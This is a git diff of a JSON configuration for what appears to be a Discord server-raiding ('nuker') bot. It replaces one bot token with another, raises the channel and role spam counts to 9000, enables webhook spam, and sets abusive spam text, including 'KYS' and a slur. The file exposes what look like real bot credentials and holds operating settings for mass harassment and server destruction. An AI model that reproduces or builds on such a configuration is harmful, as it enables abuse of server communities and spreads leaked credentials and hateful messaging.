@@ -1,12 +1,12 @@
 {
   "bot":{
-    "token":"ODMzNjQ1OTg5MDU5MTAwNjkz.YH1XVA.tgT0WGZl-Z27TUN-ZYpjRYFb5hg", 
+    "ODgwMjIyMjEyMTI3MzQ2NzIw.YSbI0Q.QSBb6Ri8DaZ4I65QD9hwnwvnBNw", 
     "bot_status":"working on 254 servers!"
   },
-  "channel_spam_name":"get fucked by the zachists",
-  "role_spam_name":"Zachists will riseᶻᴬᶜᴴᴵˢᴹᴳᴬᴺᴳ",
-  "spam_message":"@everyone EZ WIZZ, ZACHISTS WILL RISE!!!! https://discord.gg/dvAZk8fXhS",
-  "channel_spam_amount":499,
-  "role_spam_amount":249,
-  "webhook_spam":false
+  "channel_spam_name":"get fucked by monks",
+  "role_spam_name":"Your retarded",
+  "spam_message":"@everyone EZ WIN, KYS",
+  "channel_spam_amount":9000,
+  "role_spam_amount":9000,
+  "webhook_spam":true
 }
